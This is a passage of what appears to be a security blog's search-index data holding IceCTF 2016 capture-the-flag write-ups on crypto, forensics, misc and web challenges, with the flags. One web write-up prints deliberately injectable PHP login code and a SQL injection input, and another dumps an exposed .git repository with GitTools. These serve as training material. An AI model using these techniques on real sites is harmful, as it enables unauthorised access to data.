ctf(1m@db4_1nsnAt1_y_h3asElp3pl_m3)70 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)76 ctf(1m@db4_1nsnAt1_yl_3asEp_3plhm3)82 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)88 ctf(1m@db4_1nsnAt1_ypl3asE_h3pl_m3)94 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3) That begins to make sense, more filtering: 12345678910┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py | grep &apos;ctf(1@mbd4_1nsAn1ty_&apos;10 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)22 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)34 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3)46 ctf(1@mbd4_1nsAn1ty_l_3asEp_3lphm3)58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3)70 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)82 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)94 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3) Not so hard: 58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3).","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 50 - Scavenger Hunt - Misc","slug":"IceCTF-2016-IceCTF-50-Scavenger-Hunt-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.455Z","comments":true,"path":"en/IceCTF-2016-IceCTF-50-Scavenger-Hunt-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-50-Scavenger-Hunt-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description There is a flag hidden somewhere on our website, do you think you can find it? Good luck! Solution Go to the sponsors page. CTRL + U: look at source code. &lt;img class=&quot;activator&quot; src=&quot;/static/images/logos/syndis.png&quot; alt=&quot;IceCTF{Y0u_c4n7_533_ME_iM_h1Din9}&quot;&gt;: that's it.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 50 - Corrupt Transmission - Forensics","slug":"IceCTF-2016-IceCTF-50-Corrupt-Tansmission-Forencics","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.492Z","comments":true,"path":"en/IceCTF-2016-IceCTF-50-Corrupt-Tansmission-Forencics/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-50-Corrupt-Tansmission-Forencics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description We intercepted this image, but it must have gotten corrupted during the transmission. Can you try and fix it? corrupt.png Solution Check the file type: 12file corrupt.pngcorrupt.png: data This PNG is clearly corrupted, check what's wrong: 123456789pngcheck corrupt.pngcorrupt.png: CORRUPTED by text conversionERROR: corrupt.pngpngcheck -v corrupt.pngFile: corrupt.png (469363 bytes) File is CORRUPTED. It seems to have suffered EOL conversion. It was probably transmitted in text mode.ERRORS DETECTED in corrupt.png This kind of error may occurs when an image (binary) was downloaded as ASCII text. First, we'll check the PNG header with xxd: 12xxd -l8 corrupt.png00000000: 9050 4e47 0e1a 0a1b .PNG.... PNG spec tell us that not the right header, good header should be: 123(decimal) 137 80 78 71 13 10 26 10(hexadecimal) 89 50 4e 47 0d 0a 1a 0a(ASCII C notation) \\211 P N G \\r \\n \\032 \\n Let's fix it with HT hex editor. Now it sounds right: 123456xxd -l8 corrupt.png.fix00000000: 8950 4e47 0d0a 1a0a .PNG....pngcheck corrupt.png.fixcorrupt.png.fix additional data after IEND chunkERROR: corrupt.png.fix There is still an error but now PNG is recognized and we can display the image: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475file corrupt.png.fixcorrupt.png.fix: PNG image data, 500 x 408, 8-bit/color RGBA, non-interlacedpngcheck -v corrupt.png.fixFile: corrupt.png.fix (469363 bytes) chunk IHDR at offset 0x0000c, length 13 500 x 408 image, 32-bit RGB+alpha, non-interlaced chunk bKGD at offset 0x00025, length 6 red = 0x00ff, green = 0x00ff, blue = 0x00ff chunk pHYs at offset 0x00037, length 9: 2835x2835 pixels/meter (72 dpi) chunk tIME at offset 0x0004c, length 7: 20 Jun 2016 03:20:08 UTC chunk IDAT at offset 0x0005f, length 8192 zlib: deflated, 32K window, maximum compression chunk IDAT at offset 0x0206b, length 8192 chunk IDAT at offset 0x04077, length 8192 chunk IDAT at offset 0x06083, length 8192 chunk IDAT at offset 0x0808f, length 8192 chunk IDAT at offset 0x0a09b, length 8192 chunk IDAT at offset 0x0c0a7, length 8192 chunk IDAT at offset 0x0e0b3, length 8192 chunk IDAT at offset 0x100bf, length 8192 chunk IDAT at offset 0x120cb, length 8192 chunk IDAT at offset 0x140d7, length 8192 chunk IDAT at offset 0x160e3, length 8192 chunk IDAT at offset 0x180ef, length 8192 chunk IDAT at offset 0x1a0fb, length 8192 chunk IDAT at offset 0x1c107, length 8192 chunk IDAT at offset 0x1e113, length 8192 chunk IDAT at offset 0x2011f, length 8192 chunk IDAT at offset 0x2212b, length 8192 chunk IDAT at offset 0x24137, length 8192 chunk IDAT at offset 0x26143, length 8192 chunk IDAT at offset 0x2814f, length 8192 chunk IDAT at offset 0x2a15b, length 8192 chunk IDAT at offset 0x2c167, length 8192 chunk IDAT at offset 0x2e173, length 8192 chunk IDAT at offset 0x3017f, length 8192 chunk IDAT at offset 0x3218b, length 8192 chunk IDAT at offset 0x34197, length 8192 chunk IDAT at offset 0x361a3, length 8192 chunk IDAT at offset 0x381af, length 8192 chunk IDAT at offset 0x3a1bb, length 8192 chunk IDAT at offset 0x3c1c7, length 8192 chunk IDAT at offset 0x3e1d3, length 8192 chunk IDAT at offset 0x401df, length 8192 chunk IDAT at offset 0x421eb, length 8192 chunk IDAT at offset 0x441f7, length 8192 chunk IDAT at offset 0x46203, length 8192 chunk IDAT at offset 0x4820f, length 8192 chunk IDAT at offset 0x4a21b, length 8192 chunk IDAT at offset 0x4c227, length 8192 chunk IDAT at offset 0x4e233, length 8192 chunk IDAT at offset 0x5023f, length 8192 chunk IDAT at offset 0x5224b, length 8192 chunk IDAT at offset 0x54257, length 8192 chunk IDAT at offset 0x56263, length 8192 chunk IDAT at offset 0x5826f, length 8192 chunk IDAT at offset 0x5a27b, length 8192 chunk IDAT at offset 0x5c287, length 8192 chunk IDAT at offset 0x5e293, length 8192 chunk IDAT at offset 0x6029f, length 8192 chunk IDAT at offset 0x622ab, length 8192 chunk IDAT at offset 0x642b7, length 8192 chunk IDAT at offset 0x662c3, length 8192 chunk IDAT at offset 0x682cf, length 8192 chunk IDAT at offset 0x6a2db, length 8192 chunk IDAT at offset 0x6c2e7, length 8192 chunk IDAT at offset 0x6e2f3, length 8192 chunk IDAT at offset 0x702ff, length 8192 chunk IDAT at offset 0x7230b, length 1619 chunk IEND at offset 0x7296a, length 0 additional data after IEND chunkERRORS DETECTED in corrupt.png.fixdisplay corrupt.png.fix Flag is IceCTF{t1s_but_4_5cr4tch}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"IceCTF - 65 - Over the Hill - Cryptography","slug":"IceCTF-2016-IceCTF-65-Over-the-Hill-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.452Z","comments":true,"path":"en/IceCTF-2016-IceCTF-65-Over-the-Hill-Cryptography/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-65-Over-the-Hill-Cryptography/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Over the hills and far away... many times I've gazed, many times been bitten. Many dreams come true and some have silver linings, I live for my dream of a decrypted flag. crypted Description Challenge's title is Over the Hill like the Hill cipher polygraphic substitution. Looking for ciphering matrix in a search engine will help you find it. Since coding is own method can take some time and because dCode won't work for Hill cipher: we will write a script using SymPy python library. Crypto examples avaible here. Install SymPy: pip install sympy. Here's the script: 123456789101112131415161718192021from sympy.crypto.crypto import decipher_hillfrom sympy import Matrixalphabet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\"matrix = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]]ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\"key = Matrix(matrix)pt = decipher_hill(ciphertext, key, alphabet)print(pt) And here's the flag: IceCTF{linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 65 - Miners! - Web","slug":"IceCTF-2016-IceCTF-65-Miners-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.458Z","comments":true,"path":"en/IceCTF-2016-IceCTF-65-Miners-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-65-Miners-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description The miners website has been working on adding a login portal so that all miners can get the flag, but they haven't made any accounts! However, your boss demands the flag now! Can you get in anyway? miners.vuln.icec.tf Solution Notice that users database is empty! We have the source code: 12345678910111213141516&lt;?phpinclude \"config.php\";$con = mysqli_connect($MYSQL_HOST, $MYSQL_USER, $MYSQL_PASS, $MYSQL_DB);$username = $_POST[\"username\"];$password = $_POST[\"password\"];$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";$result = mysqli_query($con, $query);if (mysqli_num_rows($result) !== 1) &#123; echo \"&lt;h1&gt;Login failed.&lt;/h1&gt;\";&#125; else &#123; echo \"&lt;h1&gt;Logged in!&lt;/h1&gt;\"; echo \"&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;\";&#125;?&gt; Even if DB is empty we need the SQL request to generate 1 row: mysqli_num_rows($result) !== 1. To do that we will use and UNION with a non-empty SELECT request and we'll try to guess number of columns. Username: ' UNION SELECT 1,2,3 # and Password: random. Flag: IceCTF{the_miners_union_is_a_strong_one}. Note: Database is MySQL.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 60 - Exposed! - Web","slug":"IceCTF-2016-IceCTF-60-Exposed-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-60-Exposed-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-60-Exposed-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description John is pretty happy with himself, he just made his first website! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag? Solution Description tell us we're looking for a web hosted git repository. Let's try http://exposed.vuln.icec.tf/.git/. Oh I forgot to say! We are lazy and this tool is amazing: GitTools. Dump the git repo : ./gitdumper.sh http://exposed.vuln.icec.tf/.git/ repo. Let's see what we get in there: 1234567891011ls -A1 repo/.git/COMMIT_EDITMSGHEADconfigdescriptionindexinfologsobjectspacked-refsrefs Let's see COMMIT_EDITMSG: 12345678910111213141516cat .git/COMMIT_EDITMSGadd robots.txt# Please enter the commit message for your changes. Lines starting# with &apos;#&apos; will be ignored, and an empty message aborts the commit.## Author: James Sigurðarson &lt;jamiees2@gmail.com&gt;# Date: Wed Aug 10 21:47:49 2016 +0000## On branch master# Changes to be committed:# new file: robots.txt## Untracked files:# rewrite-history.sh# Interesting there is a robots.txt, we should have look to it sooner: http://exposed.vuln.icec.tf/robots.txt 123User-Agent: *Disallow: /.gitDisallow: /flag.php Oh yeah a flag.php file! Let's go to http://exposed.vuln.icec.tf/flag.php: there is nothing anymore here. But maybe we can found an older version of flag.php with git! Want to dig into git HEAD and all? Nah! There still is GitTools. Let's extract all now: ./extractor.sh repo/ repodump/. There is a lot of stuff in here: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798ls -RA repodumprepodump:0-60756b184c2d6b8f0247c152d8549562bc14d2d9 14-b536a10b5453686bd1dfcc50da3cb156c321fb5f 2-adf0ebdff8a972f3f6158304323feba4aa1fd482 25-631503ff237e145c7bade484c44c05a223b51155 4-cda8cc0acc8a09153351e43c40f4abeb7a823a031-6034c348380c9709715e6af60d04f684867d7234 15-e9f1db96f8b67eced8183d2d523e4ea76c008b83 20-32b31838b757a00f2e296ac198ca7d9cb930e644 26-90c2cd27cabb8ec7f55941ecee004558a070ccde 5-68162dcb661493c295f3913b1c1da2b198adfdd810-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8 16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32 21-5ea13398f975b53ff30b7ea162b2ec6897a48c68 27-541e08f75514d1caec2a62fe3a1af308da6f35d8 6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef11-4183a0cd7143899e4a5d34f01ce58317fd68921e 17-590a15d32d9a494be5830f61c5c180ddef86e43e 22-ebe74d8641b4d8b90c33d1deb69070476b0ef402 28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4 7-f521418118a088ef00fef0c3e199d30d6c7e96a512-175e312b3d3aeab77ada20ed93d1c9a3f2caf429 18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36 23-97dcb30a5862aa43984b8beee84c9477a7315856 29-bf55633224c5c76f49d42621ace07aa705ebae6e 8-584ae8349fe51e2cb25e11347003c11e92f88c7413-1746e11be489319bd8900318874b68304eb05288 19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6 24-971c67fd8ed67c3986844f627917c19c151d00bf 3-d70b2e576c0f35e83d70027434050e06f729662b 9-672c8f636b6db9c79412db177dcca75cde27c82brepodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9:.gitignore commit-meta.txt flag.php index.phprepodump/1-6034c348380c9709715e6af60d04f684867d7234:.gitignore commit-meta.txt flag.php index.phprepodump/10-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8:commit-meta.txt index.phprepodump/11-4183a0cd7143899e4a5d34f01ce58317fd68921e:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/12-175e312b3d3aeab77ada20ed93d1c9a3f2caf429:commit-meta.txt index.phprepodump/13-1746e11be489319bd8900318874b68304eb05288:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/14-b536a10b5453686bd1dfcc50da3cb156c321fb5f:.gitignore commit-meta.txt index.phprepodump/15-e9f1db96f8b67eced8183d2d523e4ea76c008b83:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32:.gitignore commit-meta.txt index.phprepodump/17-590a15d32d9a494be5830f61c5c180ddef86e43e:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36:.gitignore commit-meta.txt index.phprepodump/19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6:.gitignore commit-meta.txt index.phprepodump/2-adf0ebdff8a972f3f6158304323feba4aa1fd482:.gitignore commit-meta.txt flag.php index.phprepodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/21-5ea13398f975b53ff30b7ea162b2ec6897a48c68:.gitignore commit-meta.txt flag.php index.phprepodump/22-ebe74d8641b4d8b90c33d1deb69070476b0ef402:.gitignore commit-meta.txt index.phprepodump/23-97dcb30a5862aa43984b8beee84c9477a7315856:.gitignore commit-meta.txt flag.php index.phprepodump/24-971c67fd8ed67c3986844f627917c19c151d00bf:.gitignore commit-meta.txt index.phprepodump/25-631503ff237e145c7bade484c44c05a223b51155:.gitignore commit-meta.txt flag.php index.phprepodump/26-90c2cd27cabb8ec7f55941ecee004558a070ccde:.gitignore commit-meta.txt index.phprepodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4:.gitignore commit-meta.txt index.phprepodump/29-bf55633224c5c76f49d42621ace07aa705ebae6e:.gitignore commit-meta.txt index.phprepodump/3-d70b2e576c0f35e83d70027434050e06f729662b:.gitignore commit-meta.txt index.phprepodump/4-cda8cc0acc8a09153351e43c40f4abeb7a823a03:.gitignore commit-meta.txt index.phprepodump/5-68162dcb661493c295f3913b1c1da2b198adfdd8:.gitignore commit-meta.txt flag.php index.phprepodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef:.gitignore commit-meta.txt index.phprepodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5:.gitignore commit-meta.txt index.phprepodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/9-672c8f636b6db9c79412db177dcca75cde27c82b:.gitignore commit-meta.txt index.php Still to lazy to dig with git? Ok let's use grep: 123456789grep -r -i icectf&#123; repodump/repodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5/index.php: font-size: 2em; /* IceCTF&#123;secure_y0ur */repodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9/flag.php: echo &apos;IceCTF&#123;not_this_flag&#125;&apos;;repodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef/index.php: echo &apos;Hello World! IceCTF&#123;secure_y0ur_g1t_repos_pe0ple&#125;&apos;;repodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36/index.php: echo &apos;Hello World! IceCTF&#123;secure_y0ur_g1t_repos_pe0ple&#125;&apos;;repodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/23-97dcb30a5862aa43984b8beee84c9477a7315856/flag.php: echo &apos;IceCTF&#123;not_this_flag&#125;&apos;; Tada!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 60 - Blue Monday - Misc","slug":"IceCTF-2016-IceCTF-60-Blue-Monday-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.478Z","comments":true,"path":"en/IceCTF-2016-IceCTF-60-Blue-Monday-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-60-Blue-Monday-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Those who came before me lived through their vocations From the past until completion, they'll turn away no more And still I find it so hard to say what I need to say But I'm quite sure that you'll tell me just how I should feel today. blue_monday Solution Let's see what this file is! 12file blue_mondayblue_monday: Standard MIDI data (format 1) using 1 track at 1/220 It's some MIDI file, we've to convert it into a text format. I used this online service. That gave me: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102MFile 0 1 220MTrk0 On ch=1 n=73 v=100220 Off ch=1 n=73 v=0220 On ch=1 n=99 v=100440 Off ch=1 n=99 v=0440 On ch=1 n=101 v=100660 Off ch=1 n=101 v=0660 On ch=1 n=67 v=100880 Off ch=1 n=67 v=0880 On ch=1 n=84 v=1001100 Off ch=1 n=84 v=01100 On ch=1 n=70 v=1001320 Off ch=1 n=70 v=01320 On ch=1 n=123 v=1001540 Off ch=1 n=123 v=01540 On ch=1 n=72 v=1001760 Off ch=1 n=72 v=01760 On ch=1 n=65 v=1001980 Off ch=1 n=65 v=01980 On ch=1 n=99 v=1002200 Off ch=1 n=99 v=02200 On ch=1 n=107 v=1002420 Off ch=1 n=107 v=02420 On ch=1 n=49 v=1002640 Off ch=1 n=49 v=02640 On ch=1 n=110 v=1002860 Off ch=1 n=110 v=02860 On ch=1 n=57 v=1003080 Off ch=1 n=57 v=03080 On ch=1 n=95 v=1003300 Off ch=1 n=95 v=03300 On ch=1 n=109 v=1003520 Off ch=1 n=109 v=03520 On ch=1 n=85 v=1003740 Off ch=1 n=85 v=03740 On ch=1 n=53 v=1003960 Off ch=1 n=53 v=03960 On ch=1 n=73 v=1004180 Off ch=1 n=73 v=04180 On ch=1 n=99 v=1004400 Off ch=1 n=99 v=04400 On ch=1 n=95 v=1004620 Off ch=1 n=95 v=04620 On ch=1 n=87 v=1004840 Off ch=1 n=87 v=04840 On ch=1 n=49 v=1005060 Off ch=1 n=49 v=05060 On ch=1 n=55 v=1005280 Off ch=1 n=55 v=05280 On ch=1 n=104 v=1005500 Off ch=1 n=104 v=05500 On ch=1 n=95 v=1005720 Off ch=1 n=95 v=05720 On ch=1 n=109 v=1005940 Off ch=1 n=109 v=05940 On ch=1 n=73 v=1006160 Off ch=1 n=73 v=06160 On ch=1 n=68 v=1006380 Off ch=1 n=68 v=06380 On ch=1 n=49 v=1006600 Off ch=1 n=49 v=06600 On ch=1 n=53 v=1006820 Off ch=1 n=53 v=06820 On ch=1 n=95 v=1007040 Off ch=1 n=95 v=07040 On ch=1 n=76 v=1007260 Off ch=1 n=76 v=07260 On ch=1 n=51 v=1007480 Off ch=1 n=51 v=07480 On ch=1 n=116 v=1007700 Off ch=1 n=116 v=07700 On ch=1 n=53 v=1007920 Off ch=1 n=53 v=07920 On ch=1 n=95 v=1008140 Off ch=1 n=95 v=08140 On ch=1 n=72 v=1008360 Off ch=1 n=72 v=08360 On ch=1 n=52 v=1008580 Off ch=1 n=52 v=08580 On ch=1 n=118 v=1008800 Off ch=1 n=118 v=08800 On ch=1 n=69 v=1009020 Off ch=1 n=69 v=09020 On ch=1 n=95 v=1009240 Off ch=1 n=95 v=09240 On ch=1 n=97 v=1009460 Off ch=1 n=97 v=09460 On ch=1 n=95 v=1009680 Off ch=1 n=95 v=09680 On ch=1 n=114 v=1009900 Off ch=1 n=114 v=09900 On ch=1 n=52 v=10010120 Off ch=1 n=52 v=010120 On ch=1 n=118 v=10010340 Off ch=1 n=118 v=010340 On ch=1 n=51 v=10010560 Off ch=1 n=51 v=010560 On ch=1 n=125 v=10010780 Off ch=1 n=125 v=011780 Meta TrkEndTrkEnd Alternatively you can use midicsv that convert MIDI to CSV. It's only up to you which file you prefer to parse. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011020, 0, Header, 1, 1, 2201, 0, Start_track1, 0, Note_on_c, 0, 73, 1001, 220, Note_off_c, 0, 73, 01, 220, Note_on_c, 0, 99, 1001, 440, Note_off_c, 0, 99, 01, 440, Note_on_c, 0, 101, 1001, 660, Note_off_c, 0, 101, 01, 660, Note_on_c, 0, 67, 1001, 880, Note_off_c, 0, 67, 01, 880, Note_on_c, 0, 84, 1001, 1100, Note_off_c, 0, 84, 01, 1100, Note_on_c, 0, 70, 1001, 1320, Note_off_c, 0, 70, 01, 1320, Note_on_c, 0, 123, 1001, 1540, Note_off_c, 0, 123, 01, 1540, Note_on_c, 0, 72, 1001, 1760, Note_off_c, 0, 72, 01, 1760, Note_on_c, 0, 65, 1001, 1980, Note_off_c, 0, 65, 01, 1980, Note_on_c, 0, 99, 1001, 2200, Note_off_c, 0, 99, 01, 2200, Note_on_c, 0, 107, 1001, 2420, Note_off_c, 0, 107, 01, 2420, Note_on_c, 0, 49, 1001, 2640, Note_off_c, 0, 49, 01, 2640, Note_on_c, 0, 110, 1001, 2860, Note_off_c, 0, 110, 01, 2860, Note_on_c, 0, 57, 1001, 3080, Note_off_c, 0, 57, 01, 3080, Note_on_c, 0, 95, 1001, 3300, Note_off_c, 0, 95, 01, 3300, Note_on_c, 0, 109, 1001, 3520, Note_off_c, 0, 109, 01, 3520, Note_on_c, 0, 85, 1001, 3740, Note_off_c, 0, 85, 01, 3740, Note_on_c, 0, 53, 1001, 3960, Note_off_c, 0, 53, 01, 3960, Note_on_c, 0, 73, 1001, 4180, Note_off_c, 0, 73, 01, 4180, Note_on_c, 0, 99, 1001, 4400, Note_off_c, 0, 99, 01, 4400, Note_on_c, 0, 95, 1001, 4620, Note_off_c, 0, 95, 01, 4620, Note_on_c, 0, 87, 1001, 4840, Note_off_c, 0, 87, 01, 4840, Note_on_c, 0, 49, 1001, 5060, Note_off_c, 0, 49, 01, 5060, Note_on_c, 0, 55, 1001, 5280, Note_off_c, 0, 55, 01, 5280, Note_on_c, 0, 104, 1001, 5500, Note_off_c, 0, 104, 01, 5500, Note_on_c, 0, 95, 1001, 5720, Note_off_c, 0, 95, 01, 5720, Note_on_c, 0, 109, 1001, 5940, Note_off_c, 0, 109, 01, 5940, Note_on_c, 0, 73, 1001, 6160, Note_off_c, 0, 73, 01, 6160, Note_on_c, 0, 68, 1001, 6380, Note_off_c, 0, 68, 01, 6380, Note_on_c, 0, 49, 1001, 6600, Note_off_c, 0, 49, 01, 6600, Note_on_c, 0, 53, 1001, 6820, Note_off_c, 0, 53, 01, 6820, Note_on_c, 0, 95, 1001, 7040, Note_off_c, 0, 95, 01, 7040, Note_on_c, 0, 76, 1001, 7260, Note_off_c, 0, 76, 01, 7260, Note_on_c, 0, 51, 1001, 7480, Note_off_c, 0, 51, 01, 7480, Note_on_c, 0, 116, 1001, 7700, Note_off_c, 0, 116, 01, 7700, Note_on_c, 0, 53, 1001, 7920, Note_off_c, 0, 53, 01, 7920, Note_on_c, 0, 95, 1001, 8140, Note_off_c, 0, 95, 01, 8140, Note_on_c, 0, 72, 1001, 8360, Note_off_c, 0, 72, 01, 8360, Note_on_c, 0, 52, 1001, 8580, Note_off_c, 0, 52, 01, 8580, Note_on_c, 0, 118, 1001, 8800, Note_off_c, 0, 118, 01, 8800, Note_on_c, 0, 69, 1001, 9020, Note_off_c, 0, 69, 01, 9020, Note_on_c, 0, 95, 1001, 9240, Note_off_c, 0, 95, 01, 9240, Note_on_c, 0, 97, 1001, 9460, Note_off_c, 0, 97, 01, 9460, Note_on_c, 0, 95, 1001, 9680, Note_off_c, 0, 95, 01, 9680, Note_on_c, 0, 114, 1001, 9900, Note_off_c, 0, 114, 01, 9900, Note_on_c, 0, 52, 1001, 10120, Note_off_c, 0, 52, 01, 10120, Note_on_c, 0, 118, 1001, 10340, Note_off_c, 0, 118, 01, 10340, Note_on_c, 0, 51, 1001, 